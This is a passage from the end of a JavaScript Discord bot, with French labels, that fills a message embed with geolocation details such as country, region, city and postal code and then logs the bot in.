            .addField(`Nom du continent : `, body.continent_name)
            .addField(`Code du pays : `, body.country_code)
            .addField(`Nom du pays : `, body.country_name)
            .addField(`Code de la région : `, body.region_code)
            .addField(`Nom de la région : `, body.region_name)
            .addField(`Ville : `, body.city)
            .addField(`Code postal : `, body.zip)
        return msg.channel.send(embed);
    }

})

bot.login(token)
